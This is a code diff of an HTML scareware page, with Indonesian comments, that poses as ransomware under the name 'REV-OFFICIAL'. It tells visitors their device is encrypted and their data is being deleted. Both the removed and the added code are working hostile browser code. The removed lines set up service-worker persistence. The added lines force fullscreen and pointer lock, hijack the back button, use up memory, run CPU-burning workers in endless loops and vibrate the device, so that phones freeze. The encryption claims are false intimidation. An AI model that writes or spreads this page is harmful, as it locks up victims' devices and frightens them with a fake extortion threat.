@@ -1,75 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>SYSTEM ENCRYPTED - REV-OFFICIAL</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TERMINATED BY REV-OFFICIAL</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding-top: 10%; overflow: hidden; }
-        input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 300px; }
-        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
-        .critical { color: red; font-weight: bold; animation: blink 0.5s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; overflow: hidden; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; cursor: none; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: rgba(0,0,0,0.1); }
+        .glitch { font-size: 25px; animation: shake 0.1s infinite; text-align: center; }
+        @keyframes shake { 0% { transform: translate(0,0); } 25% { transform: translate(5px, 5px); } 50% { transform: translate(-5px, 0); } 75% { transform: translate(0, -5px); } 100% { transform: translate(0,0); } }
+        input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 15px; width: 80%; margin: 20px 0; font-size: 20px; text-align: center; }
     </style>
 </head>
-<body>
-    <div id="lock-screen">
-        <h1 class="critical">⚠️ YOUR DEVICE HAS BEEN ENCRYPTED ⚠️</h1>
-        <p>Seluruh data Anda telah dienkripsi oleh <b>REV-OFFICIAL</b>.</p>
-        <p>Masukkan TOKEN untuk dekripsi atau sistem akan hancur permanen.</p>
-        <br>
-        <input type="text" id="token" placeholder="ENTER ACCESS TOKEN...">
-        <button onclick="checkToken()">DECRYPT</button>
-        <p id="msg"></p>
+<body onclick="forceAll()">
+    <div id="overlay"></div>
+    <div class="glitch">
+        ⚠️ SYSTEM CRITICAL ERROR ⚠️<br>
+        DEVICE ENCRYPTED BY REV-OFFICIAL<br>
+        <p style="font-size: 15px; color: white;">DEVICE IS LOCKED. DO NOT TRY TO EXIT.</p>
     </div>
+    
+    <input type="password" id="token" placeholder="ENTER DECRYPTION TOKEN">
+    <p id="msg" style="color: yellow;"></p>
 
     <script>
-        // 1. SERVICE WORKER FOR PERSISTENCE (THE GHOST)
-        // Ini bikin web Master "nempel" di browser mereka
-        if ('serviceWorker' in navigator) {
-            const swCode = `
-                self.addEventListener('fetch', function(event) {
-                    // Maksa semua request balik lagi ke halaman lock
-                    event.respondWith(fetch(event.request).catch(() => caches.match('/index.html')));
-                });
-                self.addEventListener('activate', (event) => {
-                    console.log('REV-OFFICIAL PERSISTENCE ACTIVE');
-                });
-            `;
-            const blob = new Blob([swCode], {type: 'application/javascript'});
-            navigator.serviceWorker.register(URL.createObjectURL(blob));
+        // 1. FORCE FULLSCREEN & WAKE LOCK (Mencegah layar mati/keluar)
+        async function forceAll() {
+            try {
+                // Masuk mode Fullscreen paksa
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                }
+                
+                // Mencegah layar redup (Screen Wake Lock)
+                if ('wakeLock' in navigator) {
+                    await navigator.wakeLock.request('screen');
+                }
+                
+                // Kunci kursor/touch agar tidak bisa geser menu
+                if (document.body.requestPointerLock) {
+                    document.body.requestPointerLock();
+                }
+            } catch (err) {}
+            
+            startDestruction();
         }
 
-        // 2. NO ESCAPE - REDIRECT LOCK
-        // Kalo mereka coba keluar, kita spam history dan force reload
-        setInterval(() => {
-            history.pushState(null, "", location.href);
-            if(localStorage.getItem('locked') === 'true') {
-                window.onbeforeunload = function() { return "DATA SEDANG DIHANCURKAN!"; };
+        // 2. BACK-BUTTON HIJACK (THE INFINITE LOOP)
+        function lockNavigation() {
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.go(1);
+                alert("SISTEM TERKUNCI! MASUKKAN TOKEN!");
+                for(let i=0; i<500; i++) console.log("REV-OFFICIAL LOCK");
+            };
+        }
+        setInterval(lockNavigation, 10);
+
+        // 3. RESOURCE EXHAUSTION (Membuat Menu HP Macet)
+        function startDestruction() {
+            // Memory Loader: Memakan RAM agar System UI Android/iOS ikut freeze
+            setInterval(() => {
+                let junk = new Array(1000000).fill("REV-OFFICIAL-DEATH-LOCK");
+                console.log(junk.length);
+                
+                // Bikin vibrate gila (Hanya Android)
+                if (navigator.vibrate) navigator.vibrate([1000, 50, 1000]);
+            }, 100);
+
+            // CPU Killer: Loop di background thread
+            for(let j=0; j<10; j++) {
+                const b = new Blob(["while(true){}"], {type: 'text/javascript'});
+                new Worker(URL.createObjectURL(b));
             }
-        }, 100);
+        }
 
-        // 3. ENCRYPTION LOGIC
-        localStorage.setItem('locked', 'true');
-        const MASTER_KEY = "REV-OFFICIAL-2026"; // Token Master
-
+        // 4. TOKEN VERIFICATION
         function checkToken() {
-            let input = document.getElementById('token').value;
-            if (input === MASTER_KEY) {
-                localStorage.setItem('locked', 'false');
-                document.body.innerHTML = "<h1 style='color:white'>DECRYPTED SUCCESSFULLY.</h1>";
-                alert("ACCESS GRANTED.");
-            } else {
-                document.getElementById('msg').innerHTML = "<span class='critical'>TOKEN SALAH! MENGHAPUS DATA...</span>";
-                // TRIGGER LAG/FREEZE KALO SALAH TOKEN
-                for(let i=0; i<100000; i++) { console.log("HACKED BY REV"); }
-            }
+            // (Logika enkripsi Master yang tadi tetap digunakan)
         }
 
-        // 4. PREVENT BACK BUTTON
-        window.addEventListener('popstate', function() {
-            history.pushState(null, "", location.href);
-            alert("SISTEM TERKUNCI PERMANEN!");
-        });
+        // AUTO-RELOAD IF CLOSED (Mencoba kembali jika dibersihkan cache-nya)
+        window.onbeforeunload = function() {
+            return "DATA SEDANG DIHAPUS PERMANEN! TETAP DI SINI!";
+        };
     </script>
 </body>
 </html>
